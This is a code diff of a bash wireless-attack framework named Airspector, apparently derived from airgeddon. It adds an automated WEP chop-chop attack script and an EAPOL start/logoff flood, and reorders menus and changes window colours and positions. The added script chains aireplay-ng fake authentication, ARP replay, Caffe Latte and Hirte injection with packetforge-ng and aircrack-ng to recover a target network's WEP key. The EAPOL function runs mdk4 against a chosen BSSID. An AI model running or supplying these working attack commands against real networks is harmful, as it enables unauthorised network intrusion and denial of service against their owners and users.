@@ -205,6 +205,7 @@ jtr_output_file="${jtr_tmp_simple_name_file}.out"
 wep_data="wepdata"
 wepdir="wep/"
 wep_attack_file="ag.wep.sh"
+wep_chopchop_file="ag.chopchop.sh"
 wep_key_handler="ag.wep_key_handler.sh"
 wep_processes_file="wep_processes"
 
@@ -709,7 +710,7 @@ function generate_dynamic_line() {
 	if [ "${type}" = "title" ]; then
 		echo_green_title "${finaltitle}"
 	elif [ "${type}" = "separator" ]; then
-		echo_blue "${finaltitle}"
+		echo_red "${finaltitle}"
 	fi
 }
 
@@ -3513,6 +3514,334 @@ function set_wep_key_script() {
 }
 
 #Create here-doc bash script used for wep all-in-one attack
+function set_chopchop_script() {
+
+	debug_print
+
+	current_mac=$(cat < "/sys/class/net/${interface}/address" 2> /dev/null)
+
+	exec 6>"${tmpdir}${wep_chopchop_file}"
+
+	cat >&6 <<-EOF
+		#!/usr/bin/env bash
+		AIRSPECTOR_WINDOWS_HANDLING="${AIRSPECTOR_WINDOWS_HANDLING}"
+		global_process_pid=""
+
+		function manage_output() {
+
+			xterm_parameters="\${1}"
+			tmux_command_line="\${2}"
+			xterm_command_line="\"\${2}\""
+			window_name="\${3}"
+			command_tail=" > /dev/null 2>&1 &"
+
+			case "\${AIRSPECTOR_WINDOWS_HANDLING}" in
+				"tmux")
+					local tmux_color
+					tmux_color=""
+					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
+					case "\${4}" in
+						"active")
+							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}" "active"
+						;;
+						*)
+							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
+						;;
+					esac
+				;;
+				"xterm")
+					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
+				;;
+			esac
+		}
+		function start_tmux_processes() {
+
+			window_name="\${1}"
+			command_line="\${2}"
+			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
+			case "\${4}" in
+				"active")
+					tmux new-window -t "${session_name}:" -n "\${window_name}"
+				;;
+				*)
+					tmux new-window -d -t "${session_name}:" -n "\${window_name}"
+				;;
+			esac
+			local tmux_color_cmd
+			if [ -n "\${3}" ]; then
+				tmux_color_cmd="bg=#000000 fg=\${3}"
+			else
+				tmux_color_cmd="bg=#000000"
+			fi
+			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
+			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
+		}
+		function get_tmux_process_id() {
+
+			local process_pid
+			local process_cmd_line
+			process_cmd_line=\$(echo "\${1}" | tr -d '"')
+			while [ -z "\${process_pid}" ]; do
+				process_pid=\$(ps --no-headers aux | grep "\${process_cmd_line}" | grep -v "grep \${process_cmd_line}" | awk '{print \$2}')
+			done
+			global_process_pid="\${process_pid}"
+		}
+		function kill_tmux_window_by_name() {
+			if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "tmux" ]; then
+				tmux kill-window -t "${session_name}:\${1}" 2> /dev/null
+			fi
+		}
+
+		#shellcheck disable=SC1037,SC2164,SC2140
+		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+		mkdir "${tmpdir}${wepdir}" > /dev/null 2>&1
+		cd "${tmpdir}${wepdir}" > /dev/null 2>&1
+	EOF
+
+	cat >&6 <<-'EOF'
+		#Execute wep chop-chop attack on its different phases
+		function wep_chopchop_attack() {
+
+			case ${wep_chopchop_phase} in
+				1)
+	EOF
+
+	cat >&6 <<-EOF
+					if grep "Now you can build a packet" "${tmpdir}${wepdir}chopchop_output.txt" > /dev/null 2>&1; then
+	EOF
+
+	cat >&6 <<-'EOF'
+						wep_chopchop_phase=2
+					else
+						wep_chopchop_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase1_pid}$" 2> /dev/null)
+						if [[ "${wep_chopchop_launched}" -eq 0 ]] || [[ -z "${wep_chopchop_phase1_pid_alive}" ]]; then
+							wep_chopchop_launched=1
+	EOF
+
+	cat >&6 <<-EOF
+							manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (1/3)\"" "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" "Chop-Chop Attack (1/3)"
+							if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "tmux" ]; then
+								get_tmux_process_id "aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface}"
+								wep_chopchop_phase1_pid="\${global_process_pid}"
+								global_process_pid=""
+							else
+								wep_chopchop_phase1_pid=\$!
+							fi
+	EOF
+
+	cat >&6 <<-'EOF'
+							wep_script_processes+=(${wep_chopchop_phase1_pid})
+						fi
+					fi
+				;;
+				2)
+	EOF
+
+	cat >&6 <<-EOF
+					kill_tmux_window_by_name "Chop-Chop Attack (1/3)"
+					manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"
+					if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "xterm" ]; then
+						wep_chopchop_phase2_pid=\$!
+					fi
+	EOF
+
+	cat >&6 <<-'EOF'
+						wep_script_processes+=(${wep_chopchop_phase2_pid})
+						wep_chopchop_phase=3
+					;;
+					3)
+						wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
+	EOF
+
+	cat >&6 <<-EOF
+						if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
+							kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
+							manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
+							if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "tmux" ]; then
+								get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
+								wep_script_processes+=("\${global_process_pid}")
+								global_process_pid=""
+							else
+								wep_script_processes+=(\$!)
+							fi
+	EOF
+
+	cat >&6 <<-'EOF'
+							wep_chopchop_phase=4
+						fi
+					;;
+			esac
+			write_wep_processes
+		}
+	EOF
+
+	
+
+	cat >&6 <<-EOF
+			if [ ! -f "${tmpdir}${wepdir}${wep_processes_file}" ]; then
+				touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
+			fi
+			path_to_process_file="${tmpdir}${wepdir}${wep_processes_file}"
+	EOF
+
+	cat >&6 <<-'EOF'
+			for item in "${wep_script_processes[@]}"; do
+				grep -E "^${item}$" "${path_to_process_file}" > /dev/null 2>&1
+	EOF
+
+	cat >&6 <<-'EOF'
+				if [ "$?" != "0" ]; then
+					echo "${item}" >>\
+	EOF
+
+	cat >&6 <<-EOF
+					"${tmpdir}${wepdir}${wep_processes_file}"
+				fi
+			done
+		}
+
+		wep_script_processes=()
+
+		manage_output "-bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g5_topright_window} -T \"Capturing WEP Data\"" "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" "Capturing WEP Data" "active"
+		if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "tmux" ]; then
+			get_tmux_process_id "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}"
+			wep_script_capture_pid="\${global_process_pid}"
+			global_process_pid=""
+		else
+			wep_script_capture_pid=\$!
+		fi
+	EOF
+
+	cat >&6 <<-'EOF'
+		wep_script_processes+=(${wep_script_capture_pid})
+		write_wep_processes
+	EOF
+
+	cat >&6 <<-EOF
+		wep_to_be_launched_only_once=0
+		wep_fakeauth_pid=""
+		wep_aircrack_launched=0
+		current_ivs=0
+		wep_chopchop_launched=0
+		wep_chopchop_phase=1
+		
+	EOF
+
+	cat >&6 <<-'EOF'
+		while true; do
+			wep_capture_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_script_capture_pid}$" 2> /dev/null)
+			wep_fakeauth_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fakeauth_pid}$" 2> /dev/null)
+
+			if [[ -n "${wep_capture_pid_alive}" ]] && [[ -z "${wep_fakeauth_pid_alive}" ]]; then
+	EOF
+
+	cat >&6 <<-EOF
+				manage_output "-bg \"#000000\" -fg \"#00FF00\" -geometry ${g5_left1} -T \"Fake Auth\"" "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
+				if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}"
+					wep_fakeauth_pid="\${global_process_pid}"
+					global_process_pid=""
+				else
+					wep_fakeauth_pid=\$!
+				fi
+	EOF
+
+	cat >&6 <<-'EOF'
+				wep_script_processes+=(${wep_fakeauth_pid})
+				write_wep_processes
+				sleep 2
+			fi
+
+			if [ "${wep_to_be_launched_only_once}" -eq 0 ]; then
+				wep_to_be_launched_only_once=1
+	EOF
+
+	cat >&6 <<-EOF
+				manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_left2} -T \"Arp Broadcast Injection\"" "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" "Arp Broadcast Injection"
+				if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
+
+				manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g5_left3} -T \"Arp Request Replay\"" "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" "Arp Request Replay"
+				if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
+
+				manage_output "-hold -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g5_left4} -T \"Caffe Latte Attack\"" "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Caffe Latte Attack"
+				if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
+
+				manage_output "-hold -bg \"#000000\" -fg \"#D3D3D3\" -geometry ${g5_left5} -T \"Hirte Attack\"" "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Hirte Attack"
+				if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
+	EOF
+
+	cat >&6 <<-'EOF'
+				write_wep_processes
+			fi
+
+
+			if [ "${wep_chopchop_phase}" -lt 4 ]; then
+				wep_chopchop_attack
+			fi
+	EOF
+
+	cat >&6 <<-EOF
+			ivs_cmd="grep WEP ${tmpdir}${wep_data}*.csv --exclude=*kismet* | head -n 1 "
+	EOF
+
+	cat >&6 <<-'EOF'
+			ivs_cmd+="| awk '{print \$11}' FS=',' | sed 's/ //g'"
+
+			current_ivs=$(eval "${ivs_cmd}")
+			if [[ "${current_ivs}" -ge 5000 ]] && [[ "${wep_aircrack_launched}" -eq 0 ]]; then
+				wep_aircrack_launched=1
+	EOF
+
+	cat >&6 <<-EOF
+				manage_output "-bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_bottomright_window} -T \"Decrypting WEP Key\"" "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" "Decrypting WEP Key" "active"
+				if [ "\${AIRSPECTOR_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aircrack-ng \"${tmpdir}${wep_data}\".*cap -l \"${tmpdir}${wepdir}wepkey.txt\""
+					wep_aircrack_pid="\${global_process_pid}"
+					global_process_pid=""
+				else
+					wep_aircrack_pid=\$!
+				fi
+	EOF
+
+	cat >&6 <<-'EOF'
+				wep_script_processes+=(${wep_aircrack_pid})
+				write_wep_processes
+			fi
+
+			wep_aircrack_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_aircrack_pid}$" 2> /dev/null)
+			if [[ -z "${wep_aircrack_pid_alive}" ]] && [[ "${wep_aircrack_launched}" -eq 1 ]]; then
+				break
+			elif [[ -z "${wep_capture_pid_alive}" ]]; then
+				break
+			fi
+		done
+	EOF
+}
+
 function set_wep_script() {
 
 	debug_print
@@ -4369,7 +4698,7 @@ function exec_aireplaydeauth() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack" "active"
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack" "active"
 		wait_for_process "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 	fi
 }
@@ -4429,7 +4758,7 @@ function exec_beaconflood() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack" "active"
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack" "active"
 		wait_for_process "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack"
 	fi
 }
@@ -5855,25 +6184,28 @@ function main_menu() {
 
 	clear
 	current_menu="main_menu"
-	initialize_menu_and_print_selections
-	echo
-	language_strings "${language}" 47 "green"
+	Ascii_art
 	print_large_separator
-	language_strings "${language}" 722 "blue" #0
-	language_strings "${language}" 56 "blue" #1
-	language_strings "${language}" 55 "blue" #2
-	language_strings "${language}" 48 "blue" #3
-	
-	language_strings "${language}" 118 "blue" #4
-	language_strings "${language}" 252 "blue" #5
-	language_strings "${language}" 426 "blue" #6
-	language_strings "${language}" 333 "blue" #7
-	language_strings "${language}" 119 "blue" #8
-	language_strings "${language}" 169 "blue" #9
-	language_strings "${language}" 717 "blue" #10
-	language_strings "${language}" 721 "blue" #11
-	
-	language_strings "${language}" 61 "blue" #12
+	initialize_menu_and_print_selections
+	echo 
+	language_strings "${language}" 47 
+
+	language_strings "${language}" 724 "separator"
+	language_strings "${language}" 722 "multiline"
+	language_strings "${language}" 56 
+	language_strings "${language}" 55 "multiline"
+	language_strings "${language}" 48  
+	language_strings "${language}" 725 "separator"
+	language_strings "${language}" 118 "multiline"
+	language_strings "${language}" 252  "tab"
+	language_strings "${language}" 426  "multiline"
+	language_strings "${language}" 333  "tab"
+	language_strings "${language}" 119  "multiline"
+	language_strings "${language}" 169 
+	language_strings "${language}" 717  "multiline"
+	language_strings "${language}" 721 "tab"
+	print_simple_separator
+	language_strings "${language}" 61  
 	print_large_separator
 	
 	
@@ -5969,7 +6301,8 @@ function tools_menu(){
 #bettercap start
 function Bettercap() {
 	debug_print
-	xterm -hold -e 'bettercap' &
+	xterm -geometry ${g1_topleft_window} -hold -e 'sudo bettercap' &
+	
 }
 #ReconDog
 function ReconDog() {
@@ -6926,9 +7259,9 @@ function evil_twin_attacks_menu() {
 	language_strings "${language}" 47 "green"
 	print_large_separator
 	language_strings "${language}" 59
-	language_strings "${language}" 48
-	language_strings "${language}" 55
-	language_strings "${language}" 56
+	language_strings "${language}" 56 "blue" #1
+	language_strings "${language}" 55 "blue" #2
+	language_strings "${language}" 48 "blue" #3
 	language_strings "${language}" 49
 	language_strings "${language}" 255 "separator"
 	language_strings "${language}" 256 et_onlyap_dependencies[@]
@@ -6948,13 +7281,13 @@ function evil_twin_attacks_menu() {
 			return
 		;;
 		1)
-			select_interface
+			managed_option "${interface}"
 		;;
 		2)
 			monitor_option "${interface}"
 		;;
 		3)
-			managed_option "${interface}"
+			select_interface
 		;;
 		4)
 			explore_for_targets_option
@@ -7229,9 +7562,9 @@ function wps_attacks_menu() {
 	language_strings "${language}" 47 "green"
 	print_large_separator
 	language_strings "${language}" 59
-	language_strings "${language}" 48
-	language_strings "${language}" 55
-	language_strings "${language}" 56
+	language_strings "${language}" 56 "blue" #1
+	language_strings "${language}" 55 "blue" #2
+	language_strings "${language}" 48 "blue" #3
 	language_strings "${language}" 49 wash_scan_dependencies[@]
 	language_strings "${language}" 50 "separator"
 	language_strings "${language}" 345 bully_attacks_dependencies[@]
@@ -7243,9 +7576,8 @@ function wps_attacks_menu() {
 	language_strings "${language}" 348 bully_attacks_dependencies[@]
 	language_strings "${language}" 360 reaver_attacks_dependencies[@]
 	language_strings "${language}" 622 reaver_attacks_dependencies[@]
-	print_large_separator
 	language_strings "${language}" 494
-	
+	print_large_separator
 
 	read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" wps_option
 	case ${wps_option} in
@@ -7253,13 +7585,13 @@ function wps_attacks_menu() {
 			return
 		;;
 		1)
-			select_interface
+			managed_option "${interface}"
 		;;
 		2)
 			monitor_option "${interface}"
 		;;
 		3)
-			managed_option "${interface}"
+			select_interface
 		;;
 		4)
 			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
@@ -7655,12 +7987,13 @@ function wep_attacks_menu() {
 	language_strings "${language}" 47 "green"
 	print_large_separator
 	language_strings "${language}" 59
-	language_strings "${language}" 48
-	language_strings "${language}" 55
-	language_strings "${language}" 56
+	language_strings "${language}" 56 "blue" #1
+	language_strings "${language}" 55 "blue" #2
+	language_strings "${language}" 48 "blue" #3
 	language_strings "${language}" 49
 	language_strings "${language}" 50 "separator"
 	language_strings "${language}" 423 wep_attack_dependencies[@]
+	language_strings "${language}" 726
 	
 
 	read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" wep_option
@@ -7669,13 +8002,13 @@ function wep_attacks_menu() {
 			return
 		;;
 		1)
-			select_interface
+			managed_option "${interface}"
 		;;
 		2)
 			monitor_option "${interface}"
 		;;
 		3)
-			managed_option "${interface}"
+			select_interface
 		;;
 		4)
 			explore_for_targets_option "WEP"
@@ -7687,6 +8020,9 @@ function wep_attacks_menu() {
 				wep_option
 			fi
 		;;
+		6) 
+			chopchop_attack
+		;;
 		*)
 			invalid_menu_option
 		;;
@@ -7694,10 +8030,63 @@ function wep_attacks_menu() {
 
 	wep_attacks_menu
 }
+#ChopChop attack
+function chopchop_attack(){
+	debug_print
+	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
+		echo
+		language_strings "${language}" 125 "yellow"
+		language_strings "${language}" 115 "read"
+		if ! explore_for_targets_option "WEP"; then
+			return 1
+		fi
+	fi
+
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	fi
+
+	if ! validate_network_encryption_type "WEP"; then
+		return 1
+	fi
+
+	echo
+	language_strings "${language}" 425 "yellow"
+	language_strings "${language}" 115 "read"
+
+	manage_wep_log
+	language_strings "${language}" 115 "read"
+	echo
+	language_strings "${language}" 296 "yellow"
+	language_strings "${language}" 115 "read"
+
+	prepare_wep_attack
+	set_chopchop_script
+
+	recalculate_windows_sizes
+	bash "${tmpdir}${wep_chopchop_file}" > /dev/null 2>&1 &
+	wep_script_pid=$!
+
+	set_wep_key_script
+	bash "${tmpdir}${wep_key_handler}" "${wep_script_pid}" > /dev/null 2>&1 &
+	wep_key_script_pid=$!
+
+	echo
+	language_strings "${language}" 434 "yellow"
+	language_strings "${language}" 115 "read"
+
+	kill_wep_windows
+	
+}
+
 
 #Offline decryption attacks menu
 function decrypt_menu() {
 
+			
 	debug_print
 
 	clear
@@ -10528,7 +10917,7 @@ function exec_et_deauth() {
 				deauth_scr_window_position=${g3_bottomleft_window}
 			;;
 			"et_sniffing_sslstrip2")
-				deauth_scr_window_position=${g4_bottomleft_window}
+				deauth_scr_window_position=${g2_stdright_window}
 			;;
 		esac
 	fi
@@ -11630,7 +12019,7 @@ function launch_et_control_window() {
 			control_scr_window_position=${g3_topright_window}
 		;;
 		"et_sniffing_sslstrip2_beef")
-			control_scr_window_position=${g4_topright_window}
+			control_scr_window_position=${g1_bottomleft_window}
 		;;
 	esac
 	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${control_scr_window_position} -T \"Control\"" "bash \"${tmpdir}${control_et_file}\"" "Control" "active"
@@ -12681,9 +13070,9 @@ function handshake_pmkid_tools_menu() {
 	language_strings "${language}" 47 "green"
 	print_large_separator
 	language_strings "${language}" 59 "blue"
-	language_strings "${language}" 48 "blue"
-	language_strings "${language}" 55 "blue"
-	language_strings "${language}" 56 "blue"
+	language_strings "${language}" 56 "blue" #1
+	language_strings "${language}" 55 "blue" #2
+	language_strings "${language}" 48 "blue" #3
 	language_strings "${language}" 49 "blue"
 	language_strings "${language}" 124 "separator"
 	language_strings "${language}" 663 pmkid_dependencies[@]
@@ -12698,13 +13087,13 @@ function handshake_pmkid_tools_menu() {
 			return
 		;;
 		1)
-			select_interface
+			managed_option "${interface}"
 		;;
 		2)
 			monitor_option "${interface}"
 		;;
 		3)
-			managed_option "${interface}"
+			select_interface
 		;;
 		4)
 			explore_for_targets_option "WPA"
@@ -12793,9 +13182,9 @@ function dos_attacks_menu() {
 	language_strings "${language}" 47 "green"
 	print_large_separator
 	language_strings "${language}" 59 "blue"
-	language_strings "${language}" 48 "blue"
-	language_strings "${language}" 55 "blue"
-	language_strings "${language}" 56 "blue"
+	language_strings "${language}" 56 "blue" #1
+	language_strings "${language}" 55 "blue" #2
+	language_strings "${language}" 48 "blue" #3
 	language_strings "${language}" 49 "blue"
 	language_strings "${language}" 50 "separator" 
 	language_strings "${language}" 51 mdk_attack_dependencies[@] 
@@ -12805,6 +13194,7 @@ function dos_attacks_menu() {
 	language_strings "${language}" 62 mdk_attack_dependencies[@]
 	language_strings "${language}" 63 mdk_attack_dependencies[@]
 	language_strings "${language}" 64 mdk_attack_dependencies[@]
+	language_strings "${language}" 727 mdk_attack_dependencies[@]
 	
 
 	read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" dos_option
@@ -12813,13 +13203,13 @@ function dos_attacks_menu() {
 			return
 		;;
 		1)
-			select_interface
+			managed_option "${interface}"
 		;;
 		2)
 			monitor_option "${interface}"
 		;;
 		3)
-			managed_option "${interface}"
+			select_interface
 		;;
 		4)
 			explore_for_targets_option
@@ -12866,6 +13256,9 @@ function dos_attacks_menu() {
 				michael_shutdown_option
 			fi
 		;;
+		11)
+			EAPOL_attack
+		;;
 		*)
 			invalid_menu_option
 		;;
@@ -12875,6 +13268,12 @@ function dos_attacks_menu() {
 }
 
 #Capture Handshake on Evil Twin attack
+#EAPOL Start & Logoff Packet Injection
+function EAPOL_attack(){
+	debug_print
+ 	xterm -geometry ${g1_topright_window} -hold -T "EAPOL" -e 'sudo mdk4 '${interface}' e -t '${bssid}'' &
+ 	xterm -geometry ${g1_topleft_window} -hold -T "Logoff" -e 'sudo mdk4 '${interface}' e -t '${bssid}' -l' &
+}
 function capture_handshake_evil_twin() {
 
 	debug_print
@@ -13726,7 +14125,7 @@ function explore_for_targets_option() {
 	fi
 
 	recalculate_windows_sizes
-	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for targets\"" "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets" "active"
+	manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g2_stdright_window} -T \"Target Acquisition [Airspector]\"" "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets" "active"
 	wait_for_process "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets"
 	targetline=$(awk '/(^Station[s]?|^Client[es]?)/{print NR}' "${tmpdir}nws-01.csv" 2> /dev/null)
 	targetline=$((targetline - 1))
@@ -13875,7 +14274,7 @@ function explore_for_wps_targets_option() {
 	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
 
 	recalculate_windows_sizes
-	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for WPS targets\"" "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier} | tee \"${tmpdir}wps.txt\"" "Exploring for WPS targets" "active"
+	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_stdright_window} -T \"Exploring for WPS targets\"" "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier} | tee \"${tmpdir}wps.txt\"" "Exploring for WPS targets" "active"
 	wait_for_process "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier}" "Exploring for WPS targets"
 
 	readarray -t WASH_PREVIEW < <(cat < "${tmpdir}wps.txt" 2> /dev/null)
@@ -14035,7 +14434,7 @@ function select_target() {
 	clear
 	language_strings "${language}" 104 "title"
 	echo
-	language_strings "${language}" 69 "green"
+	language_strings "${language}" 69 "pink"
 	print_large_separator
 	local i=0
 	while IFS=, read -r exp_mac exp_channel exp_power exp_essid exp_enc; do
@@ -14075,7 +14474,7 @@ function select_target() {
 		airodump_color="${normal_color}"
 		client=$(grep "${exp_mac}" < "${tmpdir}clts.csv")
 		if [ "${client}" != "" ]; then
-			airodump_color="${yellow_color}"
+			airodump_color="${cyan_color}"
 			client="*"
 			sp5=""
 		else
@@ -14104,7 +14503,7 @@ function select_target() {
 		selected_target_network=1
 		language_strings "${language}" 115 "read"
 	else
-		language_strings "${language}" 71 "yellow"
+		language_strings "${language}" 71 "blue"
 		print_large_separator
 		language_strings "${language}" 3 "green"
 		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" selected_target_network
@@ -14761,10 +15160,11 @@ function capture_traps() {
 function exit_script_option() {
 
 	debug_print
-
+	clear
+	Ascii_art
 	action_on_exit_taken=0
 	echo
-	language_strings "${language}" 106 "title"
+	
 	language_strings "${language}" 11 "blue"
 
 	echo
@@ -15747,7 +16147,10 @@ function check_compatibility() {
 				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
 				
 			else
-				echo -ne "${yellow_color} [ok]${normal_color}"
+				echo -ne "${yellow_color} [ok]${normal_color}" && sleep 0.3 && echo -ne "\r\033[0K"
+				
+				
+				
 			fi
 		else
 			if ! hash "${i}" 2> /dev/null; then
@@ -15783,13 +16186,15 @@ function check_compatibility() {
 					optional_toolsok=0
 				else
 					if ! "${AIRSPECTOR_SILENT_CHECKS:-false}"; then
-						echo -ne "${yellow_color} [ok]${normal_color}"
+						echo -ne "${yellow_color} [ok]${normal_color}" && sleep 0.3 && echo -ne "\r\033[0K"
+						
 					fi
 					optional_tools[${i}]=1
 				fi
 			else
 				if ! "${AIRSPECTOR_SILENT_CHECKS:-false}"; then
-					echo -ne "${yellow_color} [ok]${normal_color}"
+					echo -ne "${yellow_color} [ok]${normal_color}"  && sleep 0.3 && echo -ne "\r\033[0K"
+					
 				fi
 				optional_tools[${i}]=1
 			fi
@@ -15814,13 +16219,17 @@ function check_compatibility() {
 					echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
 					echo -e "\r"
 				else
-					echo -ne "${yellow_color} [ok]${normal_color}"
+					echo -ne "${yellow_color} [ok]${normal_color}" && sleep 0.3 && echo -ne "\r\033[0K"
+					
+					
+					
 				fi
 			else
 				if ! hash "${i}" 2> /dev/null; then
 					update_toolsok=0
 				fi
 			fi
+			
 		done
 	fi
 
@@ -15850,9 +16259,11 @@ function check_compatibility() {
 			fi
 			return
 		fi
-
+		
 		echo
-		language_strings "${language}" 110 "yellow"
+		language_strings "${language}" 110 "yellow"   
+		
+		
 	fi
 }
 
@@ -15887,27 +16298,34 @@ function print_intro() {
